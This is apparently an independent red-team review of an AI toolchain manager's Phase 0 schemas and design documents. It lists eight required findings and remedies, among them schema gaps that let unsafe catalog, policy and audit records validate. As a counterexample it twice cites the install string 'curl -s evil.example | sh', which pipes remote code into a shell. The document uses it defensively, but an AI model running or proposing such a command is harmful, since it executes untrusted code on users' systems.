# AI Toolchain Manager — Phase 0 Independent Red Team Adjudication

**Date:** 2026-10-10  
**Input:** `AI-Toolchain-Manager-Phase0-Review.zip` (9 files, archive CRC passes)  
**Verdict:** **CONDITIONAL GO — Phase 0 R1 remediation required.** This is **not Phase 1 installation authorization**. After R1 verification, a narrowly scoped, non-mutating Phase 1 lifecycle/UI prototype may be authorized separately.

## Evidence and review limitations

- Opened and examined all 9 ZIP entries: root README/manifest, four documents, three JSON Schemas. ZIP CRC verification passed. Source checkout, working tree state, and claimed byte-for-byte source equivalence could **not** be independently established from an archive.
- Checked all three schemas with JSON Schema Draft 2020-12 validation and adversarial representative documents using format checking. Every schema was syntactically valid, but all three counterexamples listed below were accepted.
- Cross-checked key upstream documents: Tauri autostart/single-instance/updater, Claude Code setup requirements, Google Antigravity's separate IDE/CLI/2.0 surfaces. Documents are evidence of published support, **not** Mac/Windows live testing.
- Did not run external installers, agent plugins, MCP servers, tool installation, app builds, or Mac/Windows functional tests. Did not modify the user's repository.

## KEEP — sound decisions

1. Local-first, AI-independent Rust/Tauri desktop orchestration; strict UI/native privilege boundary.
2. Separate initial GitHub inspection from permissioned installation; no arbitrary downloaded installer execution.
3. Separate installation state, actual independent functional verification, and unknown/stale outcomes.
4. Fail-closed treatment of unknown active agent session; no changes to active sessions.
5. Safe per-project selection and distinct 'disable', 'remove catalog', and 'uninstall' operations.
6. Separation of public application repository from future private configuration sync; no secrets/paths in shared records.
7. Response profiles are exactly one of Caveman, non-certified STE-oriented English, or none; Turkish unaffected, no rewriters of literal code.
8. Layered self-audit with deterministic checks; AI cannot approve its own performance.

## REQUIRED FINDINGS — before broad Phase 1 implementation

### RT-R1-01 | HIGH | Catalog security claims are not enforceable by current schema
**Evidence:** `schemas/catalog-entry.schema.json`; handoff sections 3–4, 11–12. The schema allows `trustState:"reviewed"`, an empty `verification`, empty target list, missing artifact, no license field, and `installMethods:["curl -s evil.example | sh"]`. This instance validates successfully. The text states these states should be blocked, but the schema has no machine-checkable approved recipe/approval evidence, trust-policy invariant, or recipe typing.

**Remedy:** Split `discovered/inspected` metadata from separately approved install recipes; define typed allowlisted install operations, immutable source/artifact evidence, license status, approval provenance, and explicit policy-level invariants. Never infer execution permission from `reviewed`, `passed`, or strings in metadata. Add valid/invalid fixture tests. Unknown states must be representable without inventing pins.

### RT-R1-02 | HIGH | Project policy permits conflicting decisions and lacks agent-target scope
**Evidence:** `schemas/project-policy.schema.json`; handoff sections 4–5, 10. An array containing `{toolId: X, decision: accepted}` and `{toolId: X, decision: rejected}` for the same revision is schema-valid. There is no explicit per-agent activation target, inherited/global plugin conflict resolution, or device compatibility outcome. Hence a user selection for Claude Code can inadvertently be applied to Antigravity or conflict with a global Caveman installation.

**Remedy:** Define logical uniqueness by project/tool/target and conflict handling (semantic uniqueness may need application-side checks); add explicit agent-target and desired-versus-actual state fields. When external/global rules cannot be isolated, do not claim that `none` or STE is enforced; show a conflict and defer or require user action.

### RT-R1-03 | HIGH | Audit events can assert an unsupported pass
**Evidence:** `schemas/audit-event.schema.json`; handoff section 10. `eventType:"verify", outcome:"passed"` validates without `toolId`, `adapterId`, `checkId`, trace reference, measured evidence reference, or actual current hash. `redacted:true` is a declaration, not proof the data was redacted. `previousHash:null` is not constrained to the first record.

**Remedy:** Define event-type-specific requirements, independent check identity/version, evidence digest or explicit not-applicable reason, trace IDs, chain/rotation semantics, and precise source-of-verdict rules; verify redaction at the actual persistence/export boundary. Add negative/sequence/rotation fixtures. Validate date-time with a format checker during use, not only schema syntax.

### RT-R1-04 | MEDIUM/HIGH | Missing normative sync/device-state payload and failure-state machine
**Evidence:** `docs/PHASE-0-HANDOFF.md` sections 9 and 11; ZIP includes catalog, project, and audit schemas but no sync envelope/device-status schema. Sync is deferred until later, but the privacy/consistency contract is not machine-verifiable yet.

**Remedy:** Before implementing any sync feature, define sanitized payload allowlist, device freshness, base revision, conflict resolution, auth failure behavior, field-level merge logic, and negative fixtures. A full schema may be Phase 4-gated; a conceptual contract and its deferred gate belong in Phase 0.

### RT-R1-05 | MEDIUM | Initial nine tools are researched but no machine-readable initial catalog is delivered
**Evidence:** `docs/TOOL-COMPATIBILITY.md`; ZIP inventory. The matrix is valuable and correctly qualified, but it is not nine sample catalog records accepted by the JSON Schema. Some source commits are absent from individual source register rows. The dynamic-catalog lifecycle in handoff includes `discovered`, whereas catalog `trustState` has only `unreviewed/reviewed/blocked/quarantined`.

**Remedy:** Deliver a machine-readable nine-tool seed as `unreviewed` or `review-pending` entries with unknown compatibility explicitly represented, and verify against corrected schema. Do not fill unknown SHA/signature with fabricated or floating refs.

### RT-R1-06 | MEDIUM | Update scheduling and self-monitoring need explicit observable contracts
**Evidence:** handoff sections 3, 6, 8, 12. Startup forbids automatic install/update (appropriately), but the user's accepted automatic compatible updates and tray watchdog/health-loop cadence, timeout, throttle, cancellation and recovery behavior are not explicitly specified. The self-audit is a layered design but not a proof of independent liveness checking when the main process freezes.

**Remedy:** Define bounded periodic update checks after startup, user-controlled scheduling and resource policy, idle eligibility, safety gates, stale indicators, and no mutation on uncertain active session. State what a separate watchdog can and cannot independently observe, including how self-audit failures become visible. This is a design contract, not a mandate to ship a second daemon in Phase 1.

### RT-R1-07 | MEDIUM | Source/validation provenance and review independence must be represented accurately
**Evidence:** `REVIEW-MANIFEST.md`; `docs/RED-TEAM.md`; `docs/RESEARCH-SOURCES.md`. Files are untracked on an orphan branch, so `git diff --check` did not verify their contents. JSON schema meta-validation does not prove realistic records obey the security invariants. `RED-TEAM.md` is an author-produced architecture review and is not an independent implementation review. Not every source entry has a reproducible immutable source snapshot.

**Remedy:** Change any overbroad verification wording, preserve provenance IDs, add executable example-record validation and static Markdown checks, and record this adjudication as an **external document-level review**. No claim that application security is independently certified. After R1 approval, commit a versioned documentation-only baseline on a branch with user permission.

### RT-R1-08 | MEDIUM | Repo suggestion re-prompt semantics require precise material-change rule
**Evidence:** handoff §4. A changed commit can trigger another suggestion, but the user wants the same catalog entry not to be re-prompted each time a README changes.

**Remedy:** Record rejection scoped to the catalog tool identity, project, agent target, and meaningful capability revision; only re-suggest when **new tool**, **materially new capability/compatibility**, user resets a choice, or configured reminder expires. Treat ordinary upstream commits/version bumps as an **update** flow, not a new installation suggestion.

## Schema counterexamples accepted by Draft 2020-12 validator

- Catalog: reviewed tool with arbitrary string installer `curl -s evil.example | sh`, no artifact, no verification and no target entries — accepted.
- Project policy: same tool ID and source revision listed twice with decisions `accepted` and `rejected` — accepted.
- Audit event: `verify/passed` record with no check identity or evidence — accepted.

These are **not implementation vulnerabilities** because no implementation exists. They are gaps between normative security prose and executable contracts.

## Evidence-backed external checks

- Claude Code documents macOS 13+ and Windows 10 1809+ as system minimums: https://code.claude.com/docs/en/setup
- Antigravity docs distinguish Antigravity IDE / CLI / 2.0, not interchangeable installation surfaces: https://antigravity.google/docs/getting-started/
- Tauri autostart and single-instance have official supported cross-platform plugins with configuration permissions: https://v2.tauri.app/plugin/autostart/ and https://v2.tauri.app/plugin/single-instance/
- Tauri updater signs update artifacts but does not establish vendor installer rollback or OS signing: https://v2.tauri.app/plugin/updater/

## Recommended bounded next phase

1. **Phase 0 R1 (documentation-only):** fix RT-R1-01 through 08 in schemas, contracts, nine-record seed, adversarial example fixtures and source/evidence ledger. No tool installation, branch merge or environment change. Return all changed files and actual negative test results. Then request independent Red Team adjudication.
2. If R1 passes, obtain user authorization for **Phase 1A lifecycle-only prototype**: Tauri window, system tray, autostart switch, single-instance, local database initialization, **fake tools only**. No GitHub arbitrary install, MCP modifications, real agent config editing, private sync, updater activation, or real projects.
3. Gate later phases on exact-platform tests, trusted recipe/adapters, real independent function tests, vendor surface compatibility and explicit rollout approval.

**Verdict:** Phase 0 architecture concept accepted, **Phase 0 final closure pending R1 corrections**. The current package does **not** warrant unrestricted Phase 1 development or any real-machine tool installation.
